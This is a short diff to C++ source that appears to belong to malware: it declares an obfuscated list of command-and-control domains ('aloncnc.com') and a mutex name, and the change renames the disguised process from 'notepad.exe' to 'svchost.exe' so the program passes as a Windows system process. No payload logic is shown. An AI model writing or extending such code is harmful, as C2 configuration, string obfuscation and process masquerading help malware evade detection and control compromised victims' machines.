@@ -4,7 +4,7 @@ const std::string CNC_DOMAINS[] = {
 	std::string(OBFUSCATE("aloncnc.com"))
 };
 
-#define PROCESS_NAME OBFUSCATE("notepad.exe")
+#define PROCESS_NAME OBFUSCATE("svchost.exe")
 #define MUTEX_NAME OBFUSCATE("identity_mutex")
 
 
